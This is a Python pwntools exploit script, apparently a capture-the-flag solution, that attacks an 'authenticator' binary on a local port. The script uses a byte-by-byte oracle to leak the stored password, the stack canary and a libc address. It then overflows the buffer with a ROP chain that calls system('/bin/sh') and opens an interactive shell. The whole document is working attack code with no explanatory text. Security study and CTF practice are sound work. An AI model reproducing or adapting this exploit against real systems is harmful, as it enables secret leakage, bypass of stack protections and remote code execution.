from pwn import *

elf = ELF("./authenticator_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.41.so")

context.binary = elf

p = remote("localhost", 9999)
# p = process()
# gdb.attach(p)

def leak_stack(length):
    output = b''

    while len(output) != length:
        temp = len(output)
        for i in range(0xff):
            payload = output + int.to_bytes(i, 1, 'little') 

            p.sendlineafter(b'?\n', b'2')
            p.sendafter(b': ', payload)

            leak = p.recvline()
            if(b'Incorrect' not in leak):
                output = payload
                print(f"{len(output)}/{length}")
                break
        if(len(output) == temp):
            print("Newline character in the leak. Please run the script again with better luck.")
            exit(0)

    return output

leak = leak_stack(48) 
formatted_leak = [hex(u64(leak[i:i+8]))[2:].rjust(16,'0') for i in range(0, len(leak), 8)]
print(formatted_leak)

password = leak[:16]    
canary = u64(leak[24:32])
libc_base = u64(leak[40:48]) - 173432
print(hex(libc_base))
print(hex(canary))

payload = flat(
    password, b'a' * 8,
    canary, b'a' * 8,
    0x0000000000028882 + libc_base,
    0x0000000000119fdc + libc_base,
    next(libc.search(b'/bin/sh\x00')) + libc_base,
    libc.symbols['system'] + libc_base
)
p.sendlineafter(b'?\n', b'1')
p.sendafter(b': ', password)
p.sendlineafter(b'>> ', payload)

p.interactive()